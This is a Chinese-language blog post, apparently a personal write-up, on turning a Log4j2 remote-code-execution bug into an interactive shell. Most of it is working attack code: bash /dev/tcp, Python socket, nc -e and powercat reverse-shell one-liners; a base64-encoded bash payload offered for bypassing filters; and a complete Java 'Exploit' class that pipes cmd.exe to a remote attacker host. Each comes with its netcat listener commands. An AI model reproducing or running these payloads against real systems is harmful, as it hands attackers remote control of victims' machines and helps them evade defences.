---
title: 从RCE到getShell——Log4j2进阶利用
date: 2022-12-27 14:53:14
tags: 
- java
- RCE
- Reverse shell
---

## 前言

前几天复现了Log4j2的RCE漏洞，最后实现的是弹出计算器，因为恶意类Exploit是这么写的：

```java
public class Calc {
    public Calc(){
        // System.out.println("Hello!!!!!!!!!!!!!!!!!");
        try{
            String[] commands = {"calc.exe"};
            Process pc = Runtime.getRuntime().exec(commands);
            pc.waitFor();
        } catch(Exception e){
            e.printStackTrace();
        }
    }

    public static void main(String[] argv) {
        Calc e = new Calc();
    }
}
```

看起来很有趣，但没什么卵用。因为Runtime.getRuntime().exec()这个方法限制太多，能运行的只有很少一部分系统软件，而且也完全没有回显。既然实现了RCE，如果能getshell就好了，一般会这么想吧，因此明显的思路就是反弹Shell了。

## 反弹shell

反弹shell有非常多有趣的方法，最常用的是Linux环境下Bash+netcat反弹shell

### Bash反弹shell

靶机执行：

```bash
bash -i >& /dev/tcp/ip/port 0>&1
```

此时在攻击机用nc监听该端口即可：

```bash
nc -lvnp 8888
```

注：有时用-lvp参数会报错，加个n参数就好了。

[原理](https://www.freebuf.com/articles/system/178150.html)很简单，首先Linux shell的标准文件描述符如下：

- 0	标准输入，使用<
- 1    标准输出，使用>
- 2    标准错误输出，使用2>

具体命令分解如下：

**-i**是交互式bash shell；**/dev/tcp**实际上是一个socket设备，打开/dev/tcp/ip/port实际上是发起一个对该ip对应端口的tcp请求；**>&**后面接socket文件，实际上是把标准输出和标准错误输出重定向到该文件，也就是返回到远端上；最后的**0>&1**意思是将标准输入重定向到标准输出，也就是将标准输入也重定向到远程shell。

这个命令最常用，但也最容易被过滤，base64编码后可用绕过一些安全措施：

```bash
bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEzNy4xMzUvNzg5MCAwPiYx|{base64,-d}|{bash,-i}'
```

### python反弹shell

如果有python环境，可以用python实现socket通信完成反弹shell:

```bash
python -c "import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('ip',port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);"
```

攻击机用netcat监听即可：

```bash
nc -lnvp 8888
```

写成一般形式：

```python
import os,socket,subprocess
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('ip',port))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p = subprocess.call(['/bin/bash','-i'])
```

不过即便改了子线程call的参数，在Windows环境下也会报错，似乎只能用于Linux环境。

### nc反弹shell

这个是最简单但用的最少的，因为很难装上nc环境：

靶机：

```bash
nc ip 8888 -e /bin/sh  
```

```powershell
powercat ip 8888 -e c:\windows\system32\cmd.exe
```

攻击机:

```bash
nc -lvp 8888 
```

Windows下即便用IEX远程加载poweshell函数也很难绕过

![img](https://i.328888.xyz/2022/12/25/Dxdwa.png)

结果花了不少功夫还是没办法再Windows上反弹shell，但回头一想，自己一直是利用Java的Runtime.getRuntime().exec()执行cmd命令，说实话其实绕了远路，直接利用Java的socket类完成通信不更方便嘛？干脆着手写个Java类实现反弹shell吧：

### Java反弹Shell

```java
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;
public class Exploit {
    public Exploit()throws Exception{
        String host = "IP";
        int port = 8888;
        String cmd="C:\\Windows\\system32\\cmd.exe";
        Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
        Socket s = new Socket(host,port);
        InputStream pi = p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
        OutputStream po = p.getOutputStream(),so=s.getOutputStream();
        while(!s.isClosed()) {
            while(pi.available()>0) {
                so.write(pi.read());
            }
            while(pe.available()>0) {
                so.write(pe.read());
            }
            while(si.available()>0) {
                po.write(si.read());
            }
            so.flush();
            po.flush();
            Thread.sleep(50);
            try {
                p.exitValue();
                break;
            }
            catch (Exception ignored){
            }
        };
        p.destroy();
        s.close();
    }

    public static void main(String[] argv) throws Exception {
        Exploit e = new Exploit();
    }
}

```

搞定

![Dxsmp](https://i.328888.xyz/2022/12/25/Dxsmp.png)

不过中文莫名变成乱码了，大概是默认编码有问题，改天再改下。
